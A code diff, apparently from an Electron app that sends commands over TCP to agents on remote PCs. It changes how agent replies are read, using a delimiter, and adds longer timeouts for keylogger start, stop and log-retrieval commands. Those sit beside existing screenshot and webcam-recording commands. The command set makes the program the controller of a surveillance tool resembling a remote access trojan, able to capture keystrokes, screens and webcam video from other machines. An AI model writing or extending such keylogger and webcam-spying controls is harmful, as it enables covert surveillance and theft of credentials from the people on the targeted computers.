@@ -59,6 +59,9 @@ const withStatuses = async (): Promise<RemotePc[]> => {
   return statuses;
 };
 
+const AGENT_REPLY_END = '\n<<END>>\n';
+
+/** Đọc đến khi đủ `\n<<END>>\n` — khớp giao thức agent; tránh cắt nhầm ở byte đầu tiên có `\n`. */
 const sendAgentCommand = (
   host: string,
   port: number,
@@ -68,8 +71,11 @@ const sendAgentCommand = (
   new Promise((resolve, reject) => {
     const socket = new net.Socket();
     let buffer = '';
+    let finished = false;
 
     const done = (err?: Error, data?: string) => {
+      if (finished) return;
+      finished = true;
       socket.destroy();
       if (err) {
         reject(err);
@@ -84,8 +90,9 @@ const sendAgentCommand = (
     });
     socket.on('data', (chunk) => {
       buffer += chunk.toString('utf8');
-      if (buffer.includes('\n')) {
-        done(undefined, buffer.split('\n')[0]);
+      const pos = buffer.indexOf(AGENT_REPLY_END);
+      if (pos !== -1) {
+        done(undefined, buffer.slice(0, pos));
       }
     });
     socket.on('error', (err) => done(err));
@@ -267,6 +274,13 @@ ipcMain.handle('agent:run-command', async (_event, payload: { pcId: string; comm
     let timeoutMs = 2500;
     if (payload.command === 'SCREENSHOT') timeoutMs = 12000;
     else if (payload.command === 'WEBCAM_RECORD_STOP') timeoutMs = 20000;
+    else if (
+      payload.command === 'KEYLOGGER_GET_LOG' ||
+      payload.command === 'KEYLOGGER_STOP' ||
+      payload.command === 'KEYLOGGER_START'
+    ) {
+      timeoutMs = 30000;
+    }
     const raw = await sendAgentCommand(target.host, target.port, payload.command, timeoutMs);
     return { ok: raw.includes('"ok":true'), message: 'Command executed', raw };
   } catch (error) {
